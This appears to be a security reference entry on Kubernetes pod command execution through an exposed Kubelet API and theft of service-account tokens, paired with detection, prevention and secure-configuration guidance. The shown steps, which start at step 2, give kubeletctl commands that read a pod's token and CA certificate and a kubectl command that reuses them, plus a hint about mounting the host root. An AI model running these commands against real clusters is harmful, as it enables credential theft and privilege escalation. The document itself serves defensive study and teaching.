notes: An exposed Kubelet (10250) that allows exec lets you run commands in any pod and read its mounted service-account token + CA cert. Those authenticate you to the API server for the next step.

recommended.note: If you can create pods, deploy one mounting host /.

name: Kubernetes - Pod RCE and Token Theft
description: Run commands in an exposed pod via the Kubelet API, then steal the mounted service-account token and CA cert to authenticate to the API server as that pod.

steps.label: 2. Steal token + CA cert
steps.command:
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

steps.label: 3. Check API permissions
steps.command:
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

defense.why_it_works: Service account tokens automatically mounted in pods (/var/run/secrets/kubernetes.io/serviceaccount/token) grant API server access. kubeletctl executes commands inside running pods via the Kubelet API, allowing extraction of these tokens. With a high-privilege token, the attacker can create privileged pods or escalate within the cluster.
defense.prerequisites: Unauthenticated Kubelet API access (port 10250) or compromised pod access. A service account token with create pods or elevated permissions.
defense.impact: API-level privilege escalation: create privileged pods, access secrets, read all cluster resources, or gain node-level access by scheduling pods with host mounts.
defense.detection: Kubelet API exec requests (POST /exec on pods). Service account token used from unexpected IP addresses. kubectl commands with manually extracted token. SIEM: unusual API calls with service account credentials.
defense.artifacts: Kubelet API server log (exec to extract token) | Kubernetes audit log (pod creation with extracted token) | Network: kubectl API calls from attacker IP
defense.prevention: Disable automountServiceAccountToken for pods that don't need it. Grant least-privilege RBAC roles to service accounts. Restrict Kubelet API to authenticated access. Rotate service account tokens regularly. Deploy secrets encryption at rest.
defense.misconfiguration: Pods automount service account tokens with ClusterAdmin-equivalent permissions. Kubelet API allows unauthenticated command execution. Service account token has pod creation rights.
defense.vulnerable_config:
# Pod with default token automounting
apiVersion: v1
kind: Pod
spec:
  automountServiceAccountToken: true  # default
  serviceAccountName: cluster-admin-sa  # overprivileged
defense.secure_config:
# Disable automount by default
apiVersion: v1
kind: Pod
spec:
  automountServiceAccountToken: false

# ServiceAccount default
apiVersion: v1
kind: ServiceAccount
automountServiceAccountToken: false

# Grant minimal RBAC only
kind: Role
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]  # not create
